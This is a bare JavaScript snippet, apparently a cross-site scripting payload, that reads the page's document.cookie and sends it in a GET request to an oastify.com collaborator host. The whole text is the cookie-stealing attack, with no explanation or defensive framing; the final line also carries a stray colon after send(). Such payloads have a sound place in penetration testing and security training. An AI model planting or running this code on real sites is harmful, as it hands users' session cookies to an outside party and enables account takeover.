let xmlhttp = new XMLHttpRequest()
let theUrl = "https://r2ujr9vn9xsroz2uuhat8pm4bvhm5mtb.oastify.com/?cookie="
xmlhttp.open("GET", theUrl+document.cookie)
xmlhttp.withCredentials = true
xmlhttp.send():